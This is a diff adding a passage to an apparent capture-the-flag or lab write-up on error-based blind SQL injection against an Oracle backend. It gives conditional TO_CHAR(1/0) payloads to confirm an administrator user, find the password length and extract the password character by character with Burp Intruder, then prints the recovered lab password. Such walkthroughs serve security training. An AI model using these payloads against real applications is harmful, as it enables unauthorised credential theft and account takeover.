@@ -864,12 +864,143 @@ Trying the second query
 
 This query didn't throw an error because the condition ```1=2``` is not true
 
+Now, to check if there really exists a user ```administrator```, we can use the query
+```
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
+```
+If this returns an error it means the user exists in the database
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8936b62f-88ea-4871-94ba-6ed7368b5608)
 
+Cool, the user is available in the database.
 
+Lets go ahead and check the length of the password available in the database, we can use the query
+```
+'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
+```
+So, we are going to keep changing the number ```1``` until we stop getting an error
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e46becf7-62a3-4183-8e4b-71aa3588cab3)
 
+From the above screenshot it is evident that the password is greater than one. 
+Trying this manually;
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/04a6f38a-8f0d-4da9-a2a0-07d4c46f53b4)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f54ac41a-0533-4819-ac3e-02a08f76676d)
+
+From the above screenshot, we can easily tell the the length of the password is ```20```.
+
+Now, lets go ahead and extract the password. We can use this query
+```
+'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e541fbcd-3473-45de-aae7-0011903f29f4)
+
+We can see it didn't return an error, this means the string isn't the first character of the password.
+
+Lets use burp intruder to bruteforce this instead of testing it one by one. 
+
+Send the request from burp repeater to burp intruder
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e27b3077-753f-47a0-ad41-8a9e440a6d62)
+
+highlight the ```a``` and click on ```add```, leave the attack type as ```sniper```. After doing all these, you should have something like this
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/017ecdfb-7813-4345-9a0f-fa9c318f5235)
+
+Now, click on payloads. You should get this
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/42d643df-d2af-40f8-b37a-050d9464bdcd)
+
+Editing this,
+
+we'll assume that the password contains only lowercase alphanumeric characters. So, we'll add the payloads in the range a - z and 0 - 9
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a3d0c607-b4e5-477c-b8d2-dc8eea37c67b)
+
+Click on "start attack"
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fcbc3a96-7016-4364-94c2-82d32d555802)
+
+We got our first character
+
+Getting the 2nd character we can use the query
+```
+'||(SELECT CASE WHEN SUBSTR(password,2,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
+```
+Using burp intruder
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/eb38bbe6-15e0-4749-9d5a-9ec12ddd5cd0)
+
+starting the attack
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/054e4b2b-3b3e-4d91-85b1-fe2e65f184c7)
+
+We got the 2nd character
+
+Getting the 3rd character, we can use the query
+```
+'||(SELECT CASE WHEN SUBSTR(password,3,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
+```
+Using burp inruder
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/464d0ccd-fa77-488b-9480-97826b4a5ead)
+
+Starting the attack
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/28a17af0-9a5f-4f74-9cc3-0c6eb1c3be47)
+
+We got the 3rd character
+
+Getting the 4th character, we can use the query
+```
+'||(SELECT CASE WHEN SUBSTR(password,4,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
+```
+Using burp intruder
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/255fcc6f-b878-4904-b425-caf8238b6c39)
+
+Starting the attack
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0c8c5388-56fd-4a93-a007-9b5590e558fe)
+
+We got the 4th character
+
+Getting the 5th character, we can use the query
+```
+'||(SELECT CASE WHEN SUBSTR(password,5,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
+```
+Using burp intruder
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fcaa47d7-05cc-4845-ae42-8e23e7293cb8)
+
+Starting the attack
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/615d3d46-40bf-4125-9c08-22fc5547b78f)
+
+We got the 5th character
+
+We can continue this process, until we get to the 20th character(since we already know the password length to be 20). We can use the query
+```
+'||(SELECT CASE WHEN SUBSTR(password,20,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
+```
+Using burp intruder
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/732b7856-607d-4ce4-aa6e-c0f2b24b9d12)
+
+Starting the attack
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cad01836-070e-44b4-87b9-4e8044010fb9)
+
+We got the 20th character.
+
+So, I got the password to be ```b7dj6cx48d5qx0yzg7ld```, lets use this password to log in as the administrator user
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5b8381c4-8b8b-4f3b-8d5c-b8bab13c0d6d)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1c14a3fd-16cb-4a20-859c-47f08e06a38e)
+
+Cool stuff, we have completed the task for this lab,
 
 
 
